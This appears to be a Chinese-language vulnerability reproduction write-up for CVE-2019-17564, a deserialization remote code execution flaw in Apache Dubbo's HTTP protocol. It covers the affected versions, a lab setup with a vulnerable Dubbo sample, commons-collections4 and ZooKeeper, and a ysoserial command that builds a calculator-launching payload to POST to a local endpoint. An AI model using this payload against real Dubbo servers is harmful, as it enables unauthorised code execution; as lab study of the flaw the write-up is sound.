\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/D7-jvUTd9lK\_kgf\_9Q5-Og)

  

  

**1.Du****b****b****o** 框架简介

Dubbo 是⼀个⾼性能服务框架，致⼒于提供⾼性能和透明化的 RPC 远程服务调⽤⽅案，以及 SOA 服务治理⽅案，使得应⽤可通过⾼性能 RPC 实现服务的输出和输⼊功能，和 Spring 框架可以⽆缝集成。

作为⼀个分布式服务框架，以及 SOA 治理⽅案，Dubbo 其功能主要包括：

1\. ⾼性能 NIO 通讯及多协议集

2\. 成服务动态寻址与路由

3\. 软负载均衡与容错

4\. 依赖分析与服务降级

具体看这篇⽂章：https://www.jianshu.com/p/0daf78e14dcf

  

2.CVE-2019-17564

**1.** 漏洞简介

Apache Dubbo ⽀持多种协议，推荐官⽅使⽤ Dubbo 协议。Apache Dubbo HTTP 协议中的⼀个反序

列化漏洞（CVE-2019-17564），漏洞该主要原因的在于当 Apache Dubbo 启⽤ HTTP 协议之后，Apache Dubbo 对 HTTP 数据处理不当：对数据编码、序列化、反序列化，利⽤ Spring HTTP Invoker 框架处理，未经任何检查直接反序列化数据，当项⽬包中存在可⽤的 gadgets 时即可导致远程代码执⾏。

**2.** 影响范围

2.7.0 <= Apache Dubbo <= 2.7.4.1 

2.6.0 <= Apache Dubbo <= 2.6.7 

Apache Dubbo = 2.5.x

**3.** 环境搭建

dubbo-demo:https://github.com/apache/dubbo-samples/tree/master/java/dubbo-samples-http ⽤ idea 打开后，需要修改 pom.xml ⽂件中的 <dubbo.version>，将版本改为存在漏洞的 2. 7. 3

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09XThsVjtSIgPyWibz6feKJqdKP7aEG8ptN2xwOJIGwKJMSU54dG15v5yvWMSPNHiaXBGVv5AXzZYkg/640?wx_fmt=png)

  我们再往⾥⾯添加本地触发 gadgets，这⾥导⼊ commons-collections4-4.0 恶意类依赖。

```
<dependency>
<groupId>org.apache.commons</groupId>
<artifactId>commons-collections4</artifactId> <version>4.0</version>
</dependency> 
```

由于 dubbo 启动还依赖 zookeeper，因此我们还需要安装 zookeeper

https://apache.website-solution.net/zookeeper/zookeeper-3.6.2/apache-zookeeper-3.6.2-bin.tar.gz

运⾏ zookeeper 之前，我们还需要修改⼀些配置⽂件：

将 zookeeper 的 conf ⽬录下的 zoo\_sample.cfg ⽂件改成 zoo.cfg 并修改其中的两个参数

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09XThsVjtSIgPyWibz6feKJqfYgndhNkFNFXyonjasS4ErzWljhBgankVNul74Jfm5icsPquFuaQFlQ/640?wx_fmt=png) 

然后 cd 到 zookeeper 的 bin ⽬录下./zkServer.sh start 启动 zookeeper 随后启动 dubbo 项⽬中的 HttpProvider

出现下图红框中的提⽰，则证明环境搭建成功。

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09XThsVjtSIgPyWibz6feKJqicUb5mpviahTId75eQ1KJBic785EhLXwYbyib1SNaicqhLHno4oX6PYlvQA/640?wx_fmt=png)

**4.** 漏洞复现

我们⾸先⽤ yso 来⽣成⼀个序列化的 payload：

```
java-jarysoserial-0.0.6-SNAPSHOT-all.jarCommonsCollections4"deepin-calculator">/tmp/payload.ser
```

而后⽤ postman 往

```
http://192.168.199.246:8090/org.apache.dubbo.samples.http.api.DemoService
```

POST 我们⽣成的

```
payload.ser
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibiarFfCb4DNv9CkaFnPsQtetjvmfJOuDSkOiabHLmyOxzsicSRHsmqFmRovFic9TT0iaY4P6mSxSwu9Rw/640?wx_fmt=png)